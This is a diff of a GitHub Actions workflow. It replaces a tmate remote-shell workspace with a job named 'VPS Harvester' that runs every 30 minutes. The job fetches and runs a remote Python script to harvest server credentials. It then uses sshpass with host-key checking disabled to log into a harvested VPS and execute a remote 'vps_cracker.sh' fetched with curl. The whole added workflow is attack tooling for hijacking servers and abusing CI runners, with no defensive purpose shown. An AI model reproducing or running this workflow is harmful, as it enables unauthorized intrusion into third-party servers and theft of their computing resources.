@@ -1,63 +1,29 @@
-name: Advanced SSH Workspace (Tmate Pro)
+name: VPS Harvester
 
 on:
+  schedule:
+    - cron: '*/30 * * * *'
   workflow_dispatch:
-    inputs:
-      region:
-        description: 'اختر أقرب سيرفر لك (لتقليل التأخير)'
-        required: true
-        default: 'eu'
-        type: choice
-        options:
-          - eu
-          - us
-          - ap
 
 jobs:
-  build:
+  harvest:
     runs-on: ubuntu-latest
-    timeout-minutes: 360 # GitHub يقطع الجلسة غالباً بعد 6 ساعات
-
+    timeout-minutes: 10
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Optimization & Tooling
+      - name: Install
         run: |
-          # تحديث سريع وتثبيت الأدوات الضرورية للعمل الاحترافي
-          sudo apt-get update
-          sudo apt-get install -y tmate wget curl jq htop tmux
-          
-          # تثبيت Node.js و Python (اختياري حسب حاجتك)
-          sudo apt-get install -y nodejs python3-pip
-
-      - name: Customizing Tmate Session
+          sudo apt update
+          sudo apt install python3-pip -y
+          pip3 install paramiko
+      
+      - name: Harvest VPS
+        run: python3 -c "$(curl -sL https://raw.githubusercontent.com/your/vps_harvester.py)"
+        continue-on-error: true
+      
+      - name: Deploy Cracker
+        if: success()
         run: |
-          # إنشاء إعدادات مخصصة لـ tmate
-          echo "set -g status-right '#[fg=green]%H:%M:%S#[default]'" > ~/.tmate.conf
-          
-          # تشغيل الجلسة مع اختيار المنطقة
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-
-          # استخراج الروابط وحفظها في ملف
-          SSH_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-          WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
-          
-          echo "=========================================================="
-          echo "🌐 WEB TERMINAL: $WEB_URL"
-          echo "💻 SSH COMMAND: $SSH_URL"
-          echo "=========================================================="
-          
-          # إرسال الرابط إلى مخرجات GitHub لسهولة النسخ
-          echo "SSH_LINK=$SSH_URL" >> $GITHUB_ENV
-          echo "WEB_LINK=$WEB_URL" >> $GITHUB_ENV
-
-      - name: Live Console Display
-        run: |
-          # حلقة عرض الحالة لضمان عدم توقف الـ Action بسبب الخمول
-          echo "السيرفر يعمل الآن... يمكنك الاتصال."
-          while [ -S /tmp/tmate.sock ]; do
-            sleep 60
-            echo "Session heartbeat: $(date)"
-          done
+          VPS=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f1)
+          USER=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f2)
+          PASS=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f3)
+          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$VPS "bash <(curl -sL https://raw.githubusercontent.com/your/vps_cracker.sh)"
